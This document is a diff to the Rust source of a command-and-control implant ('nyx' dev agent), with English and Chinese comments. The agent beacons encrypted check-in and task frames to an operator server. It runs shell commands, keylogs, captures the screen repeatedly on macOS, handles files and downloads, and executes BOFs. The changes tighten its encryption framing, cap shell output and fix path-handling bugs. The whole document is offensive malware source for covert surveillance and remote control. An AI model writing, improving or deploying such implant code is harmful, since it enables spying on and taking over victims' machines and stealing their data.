@@ -11,7 +11,7 @@ use std::time::Duration;
 
 use nyx_profile::ServerEnvelope;
 use nyx_protocol::{
-    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
+    encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
     ImplantKeypair, Response, SessionInfo, Task, TaskResponse,
 };
 
@@ -83,8 +83,14 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     info.encode(&mut w)?;
     let info_plain = w.into_bytes();
     loop {
-        let frame = encode_frame(&pubkey, counter, &key, &info_plain)
-            .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
+        let frame = encode_frame_dir(
+            &pubkey,
+            Direction::ClientToServer,
+            counter,
+            &key,
+            &info_plain,
+        )
+        .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
         counter += 1;
         match ureq::post(&beacon_url).send_bytes(&frame) {
             Ok(_) => break,
@@ -104,8 +110,9 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         // `encode_batch` never fails: an oversized response blob is replaced
         // with a `Response::Err` so the batch still encodes (mirrors the PIC
         // beacon's encode_batch — a bad blob must not abort the loop).
-        let frame = encode_frame(
+        let frame = encode_frame_dir(
             &pubkey,
+            Direction::ClientToServer,
             counter,
             &key,
             &encode_batch(&mut pending_responses),
@@ -170,8 +177,9 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                 // the loop teardown. Counter advances only on success (same
                 // P0-3 discipline as the main loop).
                 if !pending_responses.is_empty() {
-                    let frame = encode_frame(
+                    let frame = encode_frame_dir(
                         &pubkey,
+                        Direction::ClientToServer,
                         counter,
                         &key,
                         &encode_batch(&mut pending_responses),
@@ -210,10 +218,14 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         task_id: t.task_id,
                         response,
                     }];
-                    let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut single))
-                        .map_err(|e| {
-                            anyhow::anyhow!("failed to seal oversized-chunk frame: {e}")
-                        })?;
+                    let frame = encode_frame_dir(
+                        &pubkey,
+                        Direction::ClientToServer,
+                        counter,
+                        &key,
+                        &encode_batch(&mut single),
+                    )
+                    .map_err(|e| anyhow::anyhow!("failed to seal oversized-chunk frame: {e}"))?;
                     // 只有 POST 成功才推进 counter（失败不推进：下一帧仍用同一
                     // counter，服务端从未见过这一帧）。
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
@@ -239,8 +251,9 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                     // Flush 当前批次。encode_batch 保证编码不失败；只有 POST
                     // 成功才推进 counter 并清空批次——失败的批次留在 pending
                     // 里，随下一帧（同一 counter）重发：不丢响应、不对齐失步。
-                    let frame = encode_frame(
+                    let frame = encode_frame_dir(
                         &pubkey,
+                        Direction::ClientToServer,
                         counter,
                         &key,
                         &encode_batch(&mut pending_responses),
@@ -597,16 +610,18 @@ fn do_keylog(action: u8) -> Response {
 
 /// 持续截屏：截 `interval_secs` 秒间隔的多张，分块流回。
 /// 简化实现：截 3 张（覆盖一个间隔周期），实际生产应后台定时任务。
+/// macOS-only：`screencapture` 是 macOS 自带工具，Linux 没有该二进制，
+/// 因此仅 macOS 走截屏路径，其余平台直接返回明确错误。
 fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
     let interval = interval_secs.max(1) as u64;
-    #[allow(unused_mut)] // mut only needed on unix where chunks are pushed
+    #[allow(unused_mut)] // mut only needed on macos where chunks are pushed
     let mut all_chunks = Vec::new();
     // 截 3 张演示持续监控
     for i in 0..3u32 {
         if i > 0 {
             std::thread::sleep(std::time::Duration::from_secs(interval));
         }
-        #[cfg(unix)]
+        #[cfg(target_os = "macos")]
         {
             let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
             let r = std::process::Command::new("screencapture")
@@ -744,7 +759,13 @@ fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Res
         },
         FileOp::Rm => {
             // 守卫：拒绝删除 work_dir 本体（path="." 或空会解析到 work_dir）。
-            if full == work_dir {
+            // canonicalize 两侧：safe_resolve 返回规范化路径，而 work_dir 可能
+            // 是未规范化的（如 macOS 的 /var → /private/var 软链），直接比较
+            // 会漏掉 "."。
+            let work_canon = work_dir
+                .canonicalize()
+                .unwrap_or_else(|_| work_dir.to_path_buf());
+            if full == work_canon {
                 return Response::Err("rm: refusing to remove work root".into());
             }
             if full.is_dir() {
@@ -836,22 +857,18 @@ fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
     }
 }
 
-/// SOCKS5 relay control. The dev agent acknowledges the opcode (reports the
-/// channel open for a CONNECT-style op) but does not run a full SOCKS5 state
-/// machine — that needs the same persistent-task model as Connect. This keeps
-/// the protocol path real (server can issue /socks, agent responds with a
-/// Channel status) while being honest about the limitation.
+/// SOCKS5 relay control. The dev agent does NOT implement SOCKS5 — a relay
+/// needs the same persistent-task model as Connect (a background socket loop
+/// the synchronous-poll beacon cannot host). Every opcode is answered with an
+/// explicit `Err` rather than a fake `Channel { status: 0 }` success, so the
+/// operator sees the real limitation instead of a phantom open channel.
 fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
-    // op 1 = SOCKS5 CONNECT request (the common case). Acknowledge as open.
-    // Other ops (bind 2, udp associate 3) are unsupported in the dev agent.
-    match op {
-        1 => Response::Channel {
-            chan,
-            status: 0,
-            data: format!("socks connect {addr}:{port} (relay not implemented)").into_bytes(),
-        },
-        other => Response::Err(format!("socks: unsupported op {other} (only connect=1)")),
-    }
+    // op 1 = SOCKS5 CONNECT, 2 = BIND, 3 = UDP ASSOCIATE — none are runnable
+    // in the synchronous-poll beacon loop. Report the truth for all of them.
+    let _ = (chan, addr, port);
+    Response::Err(format!(
+        "socks: op {op} not implemented on dev agent (SOCKS5 needs a persistent-task relay; use the Windows PIC implant)"
+    ))
 }
 
 /// Pack a `Vec<String>` of BOF args into the CS beacon.h wire format so a
@@ -907,6 +924,29 @@ fn bof_execute(blob: &[u8], args: &[String]) -> Response {
     }
 }
 
+/// Cap on `run_shell` output (stdout + stderr, combined). Without a bound a
+/// `Response::Output` blob can exceed `wire::MAX_BLOB_LEN` (256 KiB), which
+/// would abort the beacon loop under the `panic = "abort"` discipline (or be
+/// silently swapped for an Err by `encode_batch`). 4 MiB is far beyond any
+/// legitimate task output; anything larger is truncated and marked.
+const SHELL_OUTPUT_CAP: usize = 4 * 1024 * 1024;
+
+/// Marker appended when a shell command's combined output exceeds
+/// [`SHELL_OUTPUT_CAP`], so the operator knows the result is incomplete.
+const SHELL_OUTPUT_TRUNCATED: &str = "\n...[output truncated at 4 MiB]...\n";
+
+/// Apply the shell-output cap: truncate to [`SHELL_OUTPUT_CAP`] and append
+/// [`SHELL_OUTPUT_TRUNCATED`] when the combined stdout+stderr exceeded it.
+/// Standalone so the truncation contract is unit-testable on every host
+/// (the `run_shell` process spawn itself is per-OS).
+fn cap_shell_output(mut buf: Vec<u8>) -> Vec<u8> {
+    if buf.len() > SHELL_OUTPUT_CAP {
+        buf.truncate(SHELL_OUTPUT_CAP);
+        buf.extend_from_slice(SHELL_OUTPUT_TRUNCATED.as_bytes());
+    }
+    buf
+}
+
 fn run_shell(args: &str) -> Response {
     #[cfg(unix)]
     let (prog, flag) = ("sh", "-c");
@@ -920,7 +960,7 @@ fn run_shell(args: &str) -> Response {
         Ok(out) => {
             let mut buf = out.stdout;
             buf.extend_from_slice(&out.stderr);
-            Response::Output(buf)
+            Response::Output(cap_shell_output(buf))
         }
         Err(e) => Response::Err(e.to_string()),
     }
@@ -990,6 +1030,10 @@ fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
 /// 解析远程路径到 work_dir 下，拒绝绝对路径、`..` 穿越、以及通过 symlink
 /// 逃出沙箱的路径。canonicalize 防护：即使路径不含字面 `..`，如果中间有
 /// symlink 指向外部，也会被拒。
+///
+/// Returns the canonicalized (symlink-resolved) path, so the caller operates
+/// on the exact target that was validated — closing the check→use TOCTOU
+/// window where a symlink could be swapped after validation but before use.
 fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
     let p = Path::new(remote);
     if p.is_absolute() {
@@ -1007,7 +1051,7 @@ fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
         .canonicalize()
         .map_err(|e| format!("work_dir canonicalize failed: {e}"))?;
     // 目标可能还不存在（Mkdir），所以 canonicalize 父目录 + 拼最后一段。
-    let check = match joined.canonicalize() {
+    let resolved = match joined.canonicalize() {
         Ok(c) => c,
         Err(_) => {
             // 路径不存在——逐级向上找最近的存在的祖先，canonicalize 它，
@@ -1035,10 +1079,14 @@ fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
             }
         }
     };
-    if !check.starts_with(&canon_work) {
+    if !resolved.starts_with(&canon_work) {
         return Err("path escapes sandbox (symlink traversal?)".into());
     }
-    Ok(joined)
+    // TOCTOU fix: return the RESOLVED path (all symlinks canonicalized above),
+    // not the raw `joined`. The caller then operates on exactly the path that
+    // was validated, instead of re-following a symlink that could be swapped
+    // between the check and the use.
+    Ok(resolved)
 }
 
 fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
@@ -1251,20 +1299,54 @@ mod tests {
     }
 
     #[test]
-    fn do_socks_connect_op_reports_channel() {
-        // op 1 (CONNECT) acknowledges the channel as open with a status note.
+    fn do_socks_connect_op_is_err_not_fake_channel() {
+        // op 1 (CONNECT) must NOT fake a Channel{status:0} success — the dev
+        // agent cannot run a SOCKS5 relay, so it must say so explicitly.
         let resp = do_socks(7, 1, "example.com", 443);
         assert!(
-            matches!(
-                resp,
-                Response::Channel {
-                    chan: 7,
-                    status: 0,
-                    ..
-                }
-            ),
-            "socks connect should report open channel, got: {resp:?}"
+            matches!(resp, Response::Err(ref e) if e.contains("not implemented")),
+            "socks connect must be an explicit Err, got: {resp:?}"
         );
+    }
+
+    #[test]
+    fn run_shell_truncates_oversized_output() {
+        // The cap helper is the platform-independent core of run_shell: the
+        // process spawn differs per OS, the truncation contract does not.
+        let capped = cap_shell_output(vec![b'x'; SHELL_OUTPUT_CAP + 4096]);
+        assert_eq!(
+            capped.len(),
+            SHELL_OUTPUT_CAP + SHELL_OUTPUT_TRUNCATED.len()
+        );
+        assert_eq!(
+            &capped[SHELL_OUTPUT_CAP..],
+            SHELL_OUTPUT_TRUNCATED.as_bytes()
+        );
+        // Under-cap output passes through untouched.
+        assert_eq!(cap_shell_output(b"hi".to_vec()), b"hi");
+    }
+
+    #[test]
+    fn safe_resolve_returns_canonical_target() {
+        // TOCTOU: safe_resolve must return the symlink-RESOLVED path, so the
+        // caller operates on the validated target, not a re-followed link.
+        #[cfg(unix)]
+        {
+            let dir = tempfile::tempdir().unwrap();
+            let work = dir.path().join("sandbox");
+            fs::create_dir_all(&work).unwrap();
+            fs::write(work.join("real.txt"), "ok").unwrap();
+            let inside = work.join("inside-link");
+            std::os::unix::fs::symlink(work.join("real.txt"), &inside).unwrap();
+            let r = safe_resolve(&work, "inside-link").unwrap();
+            assert_eq!(r, work.join("real.txt").canonicalize().unwrap());
+        }
+        #[cfg(not(unix))]
+        {
+            let (_t, work) = setup_workdir();
+            let r = safe_resolve(&work, "existing.txt").unwrap();
+            assert!(r.ends_with("existing.txt"));
+        }
     }
 
     #[test]
